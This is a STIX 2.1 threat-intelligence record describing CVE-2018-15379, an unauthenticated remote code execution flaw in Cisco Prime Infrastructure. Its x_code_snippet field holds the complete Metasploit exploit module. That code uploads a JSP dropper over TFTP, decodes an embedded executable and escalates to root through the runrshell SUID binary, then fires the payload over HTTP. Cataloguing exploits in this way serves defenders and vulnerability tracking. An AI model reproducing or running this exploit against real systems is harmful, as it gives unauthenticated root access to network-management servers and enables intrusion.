{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2c9a7fab-2dcd-417e-b9af-9549c297b004",
    "created": "2024-08-14T17:04:37.769508Z",
    "modified": "2024-08-14T17:04:37.769512Z",
    "name": "Cisco Prime Infrastructure Unauthenticated Remote Code Execution",
    "description": " Cisco Prime Infrastructure (CPI) contains two basic flaws that when exploited allow an unauthenticated attacker to achieve remote code execution. The first flaw is a file upload vulnerability that allows the attacker to upload and execute files as the Apache Tomcat user; the second is a privilege escalation to root by bypassing execution restrictions in a SUID binary.  This module exploits these vulnerabilities to achieve unauthenticated remote code execution as root on the CPI default installation.  This module has been tested with CPI 3.2.0.0.258 and 3.4.0.0.348. Earlier and later versions might also be affected, although 3.4.0.0.348 is the latest at the time of writing. The file upload vulnerability should have been fixed in versions 3.4.1 and 3.3.1 Update 02. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cisco_prime_inf_rce.rb",
            "external_id": "cisco_prime_inf_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-15379"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2018/Oct/19"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-prime-infrastructure.txt"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/3723"
        },
        {
            "source_name": "reference",
            "url": "https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181003-pi-tftp"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Cisco Prime Infrastructure Unauthenticated Remote Code Execution',\n      'Description'    => %q{\n        Cisco Prime Infrastructure (CPI) contains two basic flaws that when exploited allow\n        an unauthenticated attacker to achieve remote code execution. The first flaw is a file\n        upload vulnerability that allows the attacker to upload and execute files as the Apache\n        Tomcat user; the second is a privilege escalation to root by bypassing execution restrictions\n        in a SUID binary.\n\n        This module exploits these vulnerabilities to achieve unauthenticated remote code execution\n        as root on the CPI default installation.\n\n        This module has been tested with CPI 3.2.0.0.258 and 3.4.0.0.348. Earlier and later versions\n        might also be affected, although 3.4.0.0.348 is the latest at the time of writing.\n        The file upload vulnerability should have been fixed in versions 3.4.1 and 3.3.1 Update 02.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib[at]gmail.com>'        # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2018-15379' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2018/Oct/19'],\n          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/Cisco/cisco-prime-infrastructure.txt' ],\n          [ 'URL', 'https://blogs.securiteam.com/index.php/archives/3723' ],\n          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20181003-pi-tftp' ]\n        ],\n      'Platform'       => 'linux',\n      'Arch'           => [ARCH_X86, ARCH_X64],\n      'Targets'        =>\n        [\n          [ 'Cisco Prime Infrastructure < 3.4.1 & 3.3.1 Update 02', {} ]\n        ],\n      'Privileged'     => true,\n      'DefaultOptions' => { 'WfsDelay' => 10 },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2018-10-04'\n    ))\n\n    register_options(\n      [\n        OptPort.new('RPORT', [true, 'The target port', 443]),\n        OptPort.new('RPORT_TFTP', [true, 'TFTPD port', 69]),\n        OptBool.new('SSL', [true, 'Use SSL connection', true]),\n        OptString.new('TARGETURI', [ true,  \"swimtemp path\", '/swimtemp'])\n      ])\n  end\n\n\n  def check\n    res = send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], 'swimtemp'),\n      'method' => 'GET'\n    })\n\n    unless res\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    if res.code == 404 && res.body.length == 0\n      # at the moment this is the best way to detect\n      # a 404 in swimtemp only returns the error code with a body length of 0,\n      # while a 404 to another webapp or to the root returns code plus a body with content\n      return CheckCode::Detected\n    end\n\n    CheckCode::Safe\n  end\n\n\n  def upload_payload(payload)\n    lport = datastore['LPORT'] || (1025 + rand(0xffff-1025))\n    lhost = datastore['LHOST'] || \"0.0.0.0\"\n    remote_file = rand_text_alpha(5..16) + '.jsp'\n\n    tftp_client = Rex::Proto::TFTP::Client.new(\n      \"LocalHost\"  => lhost,\n      \"LocalPort\"  => lport,\n      \"PeerHost\"   => rhost,\n      \"PeerPort\"   => datastore['RPORT_TFTP'],\n      \"LocalFile\"  => \"DATA:#{payload}\",\n      \"RemoteFile\" => remote_file,\n      \"Mode\"       => 'octet',\n      \"Context\"    => {'Msf' => self.framework, 'MsfExploit' => self},\n      \"Action\"     => :upload\n    )\n    print_status \"Uploading TFTP payload to #{rhost}:#{datastore['TFTP_PORT']} as '#{remote_file}'\"\n    tftp_client.send_write_request\n\n    remote_file\n  end\n\n  def generate_jsp_payload\n    exe = generate_payload_exe\n    base64_exe = Rex::Text.encode_base64(exe)\n\n    native_payload_name = rand_text_alpha(3..9)\n\n    var_raw     = rand_text_alpha(3..11)\n    var_ostream = rand_text_alpha(3..11)\n    var_pstream = rand_text_alpha(3..11)\n    var_buf     = rand_text_alpha(3..11)\n    var_decoder = rand_text_alpha(3..11)\n    var_tmp     = rand_text_alpha(3..11)\n    var_path    = rand_text_alpha(3..11)\n    var_tmp2    = rand_text_alpha(3..11)\n    var_path2   = rand_text_alpha(3..11)\n    var_proc2   = rand_text_alpha(3..11)\n\n    var_proc1 = rand_text_alpha(3..11)\n    chmod = %Q|\n    Process #{var_proc1} = Runtime.getRuntime().exec(\"chmod 777 \" + #{var_path} + \" \" + #{var_path2});\n    Thread.sleep(200);\n    |\n\n    var_proc3 = Rex::Text.rand_text_alpha(3..11)\n    cleanup = %Q|\n    Thread.sleep(200);\n    Process #{var_proc3} = Runtime.getRuntime().exec(\"rm \" + #{var_path} + \" \" + #{var_path2});\n    |\n\n    jsp = %Q|\n    <%@page import=\"java.io.*\"%>\n    <%@page import=\"sun.misc.BASE64Decoder\"%>\n    <%\n    try {\n      String #{var_buf} = \"#{base64_exe}\";\n      BASE64Decoder #{var_decoder} = new BASE64Decoder();\n      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());\n\n      File #{var_tmp} = File.createTempFile(\"#{native_payload_name}\", \".bin\");\n      String #{var_path} = #{var_tmp}.getAbsolutePath();\n\n      BufferedOutputStream #{var_ostream} =\n        new BufferedOutputStream(new FileOutputStream(#{var_path}));\n      #{var_ostream}.write(#{var_raw});\n      #{var_ostream}.close();\n\n      File #{var_tmp2} = File.createTempFile(\"#{native_payload_name}\", \".sh\");\n      String #{var_path2} = #{var_tmp2}.getAbsolutePath();\n\n      PrintWriter #{var_pstream} =\n        new PrintWriter(new FileOutputStream(#{var_path2}));\n      #{var_pstream}.println(\"!#/bin/sh\");\n      #{var_pstream}.println(\"/opt/CSCOlumos/bin/runrshell '\\\\\" && \" + #{var_path} + \" #'\");\n      #{var_pstream}.close();\n      #{chmod}\n\n      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path2});\n      #{cleanup}\n    } catch (Exception e) {\n    }\n    %>\n    |\n\n    jsp = jsp.gsub(/\\n/, '')\n    jsp = jsp.gsub(/\\t/, '')\n    jsp = jsp.gsub(/\\x0d\\x0a/, \"\")\n    jsp = jsp.gsub(/\\x0a/, \"\")\n\n    return jsp\n  end\n\n\n  def exploit\n    jsp_payload = generate_jsp_payload\n\n    jsp_name = upload_payload(jsp_payload)\n\n    # we land in /opt/CSCOlumos, so we don't know the apache directory\n    # as it changes between versions... so leave this commented for now\n    # ... and try to find a good way to clean it later\n    print_warning \"#{jsp_name} must be manually removed from the Apache in /opt/CSCOlumos\"\n    # register_files_for_cleanup(jsp_name)\n\n    print_status(\"#{peer} - Executing payload...\")\n    send_request_cgi({\n      'uri'    => normalize_uri(datastore['TARGETURI'], jsp_name),\n      'method' => 'GET'\n    })\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-04",
    "x_mitre_platforms": [
        "linux'"
    ]
}